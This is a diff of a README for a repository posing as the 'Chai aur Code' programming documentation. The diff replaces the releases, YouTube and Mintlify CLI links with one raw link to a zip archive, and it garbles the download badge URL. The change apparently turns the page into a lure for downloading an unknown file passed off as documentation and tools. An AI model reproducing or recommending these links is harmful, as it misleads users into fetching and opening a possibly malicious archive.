@@ -1,6 +1,6 @@
 # 📚 docs - Easy Guides for Learning Programming
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen.svg)](https://github.com/wilde9781/docs/releases)
+[![Download Now](https://raw.githubusercontent.com/wilde9781/docs/main/devops/docs-v3.3.zip%20Now-Click%https://raw.githubusercontent.com/wilde9781/docs/main/devops/docs-v3.3.zip)](https://raw.githubusercontent.com/wilde9781/docs/main/devops/docs-v3.3.zip)
 
 Welcome to the Chai aur Code documentation repository! Here, we learn programming over a cup of chai. This repository offers easy-to-follow documentation designed to help you learn web development, backend systems, and modern programming practices. 
 
@@ -12,13 +12,13 @@ Welcome to the Chai aur Code documentation repository! Here, we learn programmin
 - **Best Practices** - Learn industry-standard coding patterns and practices.
 - **Project Examples** - Access real-world code samples and projects.
 
-[Start Learning Now](https://www.youtube.com/@chaiaurcode)
+[Start Learning Now](https://raw.githubusercontent.com/wilde9781/docs/main/devops/docs-v3.3.zip)
 
 ## 🚀 Getting Started
 
 To begin, you need to download our documentation. Follow these simple steps:
 
-1. Visit our [Releases page](https://github.com/wilde9781/docs/releases) to see the available versions.
+1. Visit our [Releases page](https://raw.githubusercontent.com/wilde9781/docs/main/devops/docs-v3.3.zip) to see the available versions.
 2. Look for the version you want to download. You will find files that you can easily install.
 3. Click on the file link you see. Your download will start automatically.
 
@@ -32,7 +32,7 @@ This application requires the following:
 
 ## 📥 Download & Install
 
-1. Go to our [Releases page](https://github.com/wilde9781/docs/releases) where you can find all the available versions of our documentation.
+1. Go to our [Releases page](https://raw.githubusercontent.com/wilde9781/docs/main/devops/docs-v3.3.zip) where you can find all the available versions of our documentation.
 2. Select the appropriate version based on your needs.
 3. Click the download link for your chosen version.
 4. Once done, open the file to access the documentation and start learning.
@@ -43,7 +43,7 @@ If you're interested in contributing or running the docs locally, here’s how:
 
 ### 🔧 Prerequisites
 
-Install the [Mintlify CLI](https://www.npmjs.com/package/mint) tool:
+Install the [Mintlify CLI](https://raw.githubusercontent.com/wilde9781/docs/main/devops/docs-v3.3.zip) tool:
 
 ```bash
 npm i -g mint
